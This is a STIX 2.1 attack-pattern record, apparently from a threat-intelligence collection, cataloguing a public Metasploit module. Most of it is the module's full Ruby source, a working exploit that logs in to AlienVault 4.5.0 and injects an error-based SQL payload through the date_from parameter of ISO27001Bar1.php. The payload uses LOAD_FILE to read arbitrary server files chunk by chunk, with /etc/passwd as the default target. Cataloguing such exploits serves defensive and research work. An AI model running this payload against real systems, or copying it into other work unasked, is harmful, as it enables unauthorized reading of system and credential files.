{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2b236c0-03a9-4771-b95f-a075c358cda5",
    "created": "2024-08-14T16:31:46.27788Z",
    "modified": "2024-08-14T16:31:46.277884Z",
    "name": "\"AlienVault Authenticated SQL Injection Arbitrary File Read\"",
    "description": " AlienVault 4.5.0 is susceptible to an authenticated SQL injection attack via a PNG generation PHP file. This module exploits this to read an arbitrary file from the file system. Any authenticated user is able to exploit it, as administrator privileges aren't required.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/alienvault_iso27001_sqli.rb",
            "external_id": "alienvault_iso27001_sqli.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"AlienVault Authenticated SQL Injection Arbitrary File Read\",\n      'Description'    => %q{\n        AlienVault 4.5.0 is susceptible to an authenticated SQL injection attack via a PNG\n        generation PHP file. This module exploits this to read an arbitrary file from\n        the file system. Any authenticated user is able to exploit it, as administrator\n        privileges aren't required.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module\n        ],\n      'References'     =>\n        [\n          ['EDB', '32644']\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL' => true\n        },\n      'Platform'       => ['linux'],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-03-30'))\n\n      register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),\n        OptString.new('USERNAME', [ true, 'Single username' ]),\n        OptString.new('PASSWORD', [ true, 'Single password' ]),\n        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ])\n      ])\n\n  end\n\n  def run\n\n    print_status(\"Get a valid session cookie...\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')\n    })\n\n    unless res and res.code == 200\n      print_error(\"Server did not respond in an expected way\")\n      return\n    end\n\n    cookie = res.get_cookies\n\n    if cookie.blank?\n      print_error(\"Could not retrieve a cookie\")\n      return\n    end\n\n    post = {\n      'embed' => '',\n      'bookmark_string' => '',\n      'user' => datastore['USERNAME'],\n      'passu' => datastore['PASSWORD'],\n      'pass' => Rex::Text.encode_base64(datastore['PASSWORD'])\n    }\n\n    print_status(\"Login...\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),\n      'method' => 'POST',\n      'vars_post' => post,\n      'cookie' => cookie\n    })\n\n    unless res and res.code == 302\n      print_error(\"Server did not respond in an expected way\")\n      return\n    end\n\n    unless res.headers['Location'] && res.headers['Location'] == normalize_uri(target_uri.path, 'ossim/')\n      print_error(\"Authentication failed\")\n      return\n    end\n\n    cookie = res.get_cookies\n\n    if cookie.blank?\n      print_error(\"Could not retrieve the authenticated cookie\")\n      return\n    end\n\n    i = 0\n    full = ''\n    filename = datastore['FILEPATH'].unpack(\"H*\")[0]\n    left_marker = Rex::Text.rand_text_alpha(6)\n    right_marker = Rex::Text.rand_text_alpha(6)\n\n    print_status(\"Exploiting SQLi...\")\n\n    loop do\n      file = sqli(left_marker, right_marker, i, cookie, filename)\n      return if file.nil?\n      break if file.empty?\n\n      str = [file].pack(\"H*\")\n      full << str\n      vprint_status(str)\n\n      i = i+1\n    end\n\n    path = store_loot('alienvault.file', 'text/plain', datastore['RHOST'], full, datastore['FILEPATH'])\n    print_good(\"File stored at path: \" + path)\n  end\n\n  def sqli(left_marker, right_marker, i, cookie, filename)\n    pay =  \"2014-02-28' AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack(\"H*\")[0]},\"\n    pay << \"(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{filename})) AS CHAR),\"\n    pay << \"0x20)),#{(50*i)+1},50)),0x#{right_marker.unpack(\"H*\")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS\"\n    pay << \" GROUP BY x)a) AND 'xnDa'='xnDa\"\n\n    get = {\n      'date_from' => pay,\n      'date_to' => '2014-03-30'\n    }\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'report', 'BusinessAndComplianceISOPCI', 'ISO27001Bar1.php'),\n      'cookie' => cookie,\n      'vars_get' => get\n    })\n\n    if res and res.body and res.body =~ /#{left_marker}(.*)#{right_marker}/\n      return $1\n    else\n      print_error(\"Server did not respond in an expected way\")\n      return nil\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-03-30",
    "x_mitre_platforms": [
        "['linux']"
    ]
}